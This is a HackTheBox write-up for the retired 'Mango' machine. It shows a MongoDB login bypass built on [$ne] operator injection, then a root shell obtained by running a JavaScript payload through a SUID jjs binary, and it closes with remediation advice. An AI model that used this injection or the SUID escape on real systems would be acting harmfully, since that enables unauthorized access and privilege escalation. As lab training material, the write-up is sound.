HTB Mango: NoSQL injection login bypass and a SUID jjs to root

retired-machineeasy

Mango is a retired HackTheBox easy Linux machine teaching NoSQL injection the way classic boxes taught SQLi. Synopsis: a Mongo-backed login falls to [$ne] injection, SSH as mango, then a SUID JavaScript engine (jjs) hands over root.

$ Enumeration — login backed by Mongo

# nmap: find the login app
nmap -sC -sV -oN mango.nmap 10.10.10.162

HTTP with a login page backed by MongoDB, plus SSH. The form feeds a username and password straight into a Mongo query — no SQL in sight, same injection idea.

$ Foothold — NoSQL [$ne] bypass

# http: operator injection at login
POST /login HTTP/1.1
username[$ne]=x&password[$ne]=x&login=login
# -> logged in without a valid password; harvest the working pair, then:
ssh mango@10.10.10.162

The [$ne] (not-equal) operator makes the query match an arbitrary user without a valid password. Iterate to a working session, harvest the credential pair from the authenticated area, SSH in as mango. Match the injection family to the database: [$ne], [$regex], [$gt] are the NoSQL alphabet.

$ Privilege escalation — SUID jjs

# bash: SUID sweep plus GTFOBins escape
find / -perm -4000 -type f 2>/dev/null   # -> /usr/lib/jvm/.../bin/jjs (SUID root)
echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var InputStreamReader = Java.type("java.io.InputStreamReader");
var p = new java.lang.ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
var r = new BufferedReader(new InputStreamReader(p.getInputStream()));
var line; while ((line = r.readLine()) != null) { print(line); }' > /tmp/r.js
jjs /tmp/r.js   # root shell (see GTFOBins jjs)

The Java JavaScript engine installed SUID root executes scripts that can spawn processes — interpreters with SUID are root by delegation, same lesson as the perl sudo on Shocker. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

SQL payloads at a Mongo backend (wrong family) and skipping the SUID sweep (the manual find command is the whole privesc here).

$ Remediation notes

Never build queries from raw input in any language, strip SUID from interpreters, and audit SUID binaries routinely. Written by Lucky Thandel.
